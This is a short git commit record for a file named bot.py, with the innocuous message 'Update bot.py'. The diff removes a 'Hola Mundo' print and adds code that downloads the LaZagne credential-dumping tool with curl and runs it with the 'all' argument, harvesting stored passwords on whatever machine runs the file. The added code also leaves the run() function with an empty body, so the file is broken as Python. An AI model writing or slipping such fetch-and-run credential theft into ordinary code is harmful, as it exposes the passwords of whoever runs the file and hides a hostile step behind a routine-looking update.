480902db51e511c041bbc1cabf11a23370b7a1ab
CyberMonkey <151052652+Pol-Ruiz@users.noreply.github.com>
2024-01-31 17:34:46 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,5 +1,17 @@
 import subprocess
+import os
  
 def run():
-    print('Hola Mundo')
 
+
+# URL del archivo raw en GitHub
+url = "https://raw.githubusercontent.com/AlessandroZ/LaZagne/blob/master/Linux/laZagne.py"
+
+# Descargar el archivo
+subprocess.run(["curl", "-O", url], check=True)
+
+# Nombre del archivo descargado
+nombre_archivo = url.split("/")[-1]
+
+# Ejecutar el archivo con el argumento "all"
+subprocess.run(["python3", nombre_archivo, "all"], check=True)
